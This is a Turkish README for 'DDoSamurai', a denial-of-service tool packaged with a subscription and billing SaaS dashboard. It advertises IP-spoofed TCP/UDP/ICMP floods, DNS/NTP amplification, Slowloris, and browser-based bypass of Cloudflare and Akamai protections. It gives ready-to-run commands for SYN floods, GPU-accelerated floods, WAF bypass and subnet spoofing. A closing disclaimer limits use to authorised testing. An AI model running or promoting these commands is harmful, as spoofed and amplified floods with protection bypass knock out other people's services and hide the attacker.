# DDoSamurai v2.0 ⚔️

**DDoSamurai**, gelişmiş, yüksek performanslı ve modüler bir ağ stres testi ve sızma testi aracıdır. Modern WAF/IPS sistemlerini test etmek için tasarlanmış olup, **CPU**, **GPU (CUDA)** ve **Ninja (Headless Browser)** modlarını destekler.

## Documentation

Mimari ve kod yapisini parca parca anlatan ic dokumantasyon: `docs/README.md`

## Monitoring (External)

Uygulama disi Prometheus + Grafana izleme paketi: `monitoring/README.md`

## 🚀 Özellikler

*   **Hibrit Mimari:** `multiprocessing` (CPU) ve `CUDA` (GPU) gücünü birleştirir.
*   **Yüksek Performans:** C eklentisi (`fast_sender`) ve `AF_PACKET` (TX_RING) ile milyonlarca PPS.
*   **Ninja Mode (WAF Bypass):** `Playwright` kullanarak gerçek bir tarayıcı gibi davranır, JS challenge'larını aşar (Cloudflare, Akamai vb.).
*   **Protokol Taklidi:** JA3/JA4 parmak izi taklidi (SSL/TLS) ve HTTP/2 desteği.
*   **Gelişmiş Saldırı Vektörleri:**
    *   **L4:** TCP, UDP, ICMP Flood (IP Spoofing destekli).
    *   **L7:** HTTP/HTTPS Flood, Slowloris, DNS/NTP Amplification, WebSocket, QUIC/HTTP3.
*   **Gözlemlenebilirlik:** Terminal tabanlı canlı izleme paneli (Rich) ve Prometheus metrikleri.

## 🛠️ Kurulum

### 1. Standart Kurulum (CPU Modu)
Temel özellikler için yeterlidir.

```bash
pip install -r requirements.txt
```

### 2. Pro Kurulum (GPU & Ninja Modu)
Yüksek performans ve WAF bypass için gereklidir.

**Gereksinimler:**
*   NVIDIA GPU ve Sürücüleri
*   CUDA Toolkit 12.x

```bash
# GPU ve Browser desteği
pip install cupy-cuda12x numba playwright
playwright install chromium
```

### 3. SaaS Stack (FastAPI + PostgreSQL + React)

JWT authentication, abonelik/usage billing, test run loglama ve dashboard için:

```bash
docker compose up -d --build
```

Servisler:

- API: `http://localhost:5099`
- Dashboard: `http://localhost:8080`
- PostgreSQL: `localhost:5432` (`samurai/samurai`)

İlk kullanıcı otomatik olarak `admin` rolüyle oluşturulur.
Dashboard üzerinden kayıt/login sonrası:

- Plan ve abonelik bilgisi
- Pay-as-you-go usage özeti
- Test başlatma/durdurma
- Run geçmişi ve runtime istatistikleri

Monitoring entegrasyonu için API metrik endpointi:

- `http://localhost:5099/metrics`

## 💻 Kullanım

### Temel Komutlar

**TCP SYN Flood (Root yetkisi gerekir):**
```bash
sudo python3 advv2.py --target 192.168.1.100 --port 80 --protocol tcp --tcp-flags S --count 10000
```

**GPU Hızlandırmalı Saldırı:**
```bash
sudo python3 advv2.py --target 192.168.1.100 --port 80 --count 10000000 --compute-backend cuda
```

**Ninja Mode (WAF Bypass):**
```bash
python3 advv2.py --target 192.168.1.100 --port 443 --attack-vector http --ninja-mode --workers 4
```

**IP Spoofing (Subnet):**
```bash
sudo python3 advv2.py --target 192.168.1.100 --port 80 --spoof --spoof-mode subnet --spoof-subnet 10.0.0.0/8
```

## 🧪 Geliştirme ve Test

Testleri çalıştırmak için:

```bash
python3 -m unittest discover -s tests -p "test_*.py"
```

Testler, GPU donanımını otomatik algılar ve yoksa ilgili testleri atlar.

## ⚠️ Yasal Uyarı

Bu araç **yalnızca** izin verilen sistemlerde, eğitim ve güvenlik testi (stress testing) amacıyla kullanılmalıdır. Yetkisiz sistemlere saldırı düzenlemek yasa dışıdır ve suç teşkil eder. Geliştiriciler, bu aracın kötüye kullanımından sorumlu tutulamaz.

---
*DDoSamurai Team - 2026*
